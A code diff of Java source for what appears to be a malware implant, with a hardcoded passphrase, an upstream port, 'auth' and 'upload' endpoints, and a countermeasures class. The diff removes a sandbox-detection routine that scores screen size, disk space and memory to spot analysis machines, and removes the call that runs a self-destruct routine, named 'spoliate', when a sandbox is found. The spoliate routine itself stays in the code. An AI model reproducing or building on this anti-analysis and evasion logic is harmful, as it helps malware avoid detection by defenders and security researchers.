@@ -95,12 +95,7 @@ class nConfig
     public static int upstreamPort = 35506;
     public static int virtThreshold = 10; //6 for when it's ready
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
-    public static Hashtable endpoints = new Hashtable(){
-        {
-            put("auth","60000");
-            put("upload","60001");
-        }
-    };
+    public static Hashtable endpoints = new Hashtable();
 }
 
 class iAgent
@@ -130,10 +125,9 @@ class iAgent
 
         //check if the program can reach out and if it's in a sandbox
 
-        if (cm.chkSandbox())
-        {
-            cm.spoliate();
-        }
+        nConfig.endpoints.put("auth","60000");
+        nConfig.endpoints.put("upload","60001");
+        
 
         //execute initial 
         //start loop
@@ -940,6 +934,7 @@ class iAgent
             }
         }
 
+        
 
 
         //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
@@ -962,70 +957,6 @@ class iAgent
 
     private static class countermeasures 
     {
-        private boolean chkSandbox() throws SocketException
-        {
-            //this should go in the loader too 
-            //score the system
-            int score = 0;
-
-            //get resolution
-            Toolkit awtToolkit = Toolkit.getDefaultToolkit();
-            try
-            {
-                int scWidth = (int) awtToolkit.getScreenSize().getWidth();
-                int scHeight = (int) awtToolkit.getScreenSize().getHeight();
-                if ((int) scWidth < 1300 && scHeight < 850)
-                {
-                    score += 1;
-                }
-            }
-            catch (HeadlessException h)
-            {
-                score += 1;
-            }
-
-            //<40gb (+5), <60gb (+3), <80gb (+1)
-            long diskSpace = new File("/").getTotalSpace();
-
-            if (diskSpace > 60000000000L && diskSpace < 80000000000L)
-            {
-                score += 1;
-            }
-            else if (diskSpace > 40000000000L && diskSpace < 60000000000L)
-            {
-                score += 2;
-            }
-            else if (diskSpace < 40000000000L)
-            {
-                score += 3;
-            }
-
-            //<2gb (+3), <4gb (+2) <6gb (+1)
-            long memorySize = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
-            
-            if (memorySize > 4000000000L && memorySize < 6000000000L)
-            {
-                score += 1;
-            }
-            else if (memorySize > 2000000000L && memorySize < 4000000000L) 
-            {
-                score += 2;
-            }
-            else if (memorySize < 2000000000L) 
-            {
-                score += 3;
-            }
-
-            if (score <= config.virtThreshold)
-            {
-                return false;
-            }
-            else
-            {
-                return true;
-            }
-        }
-
         private void spoliate()
         {
 
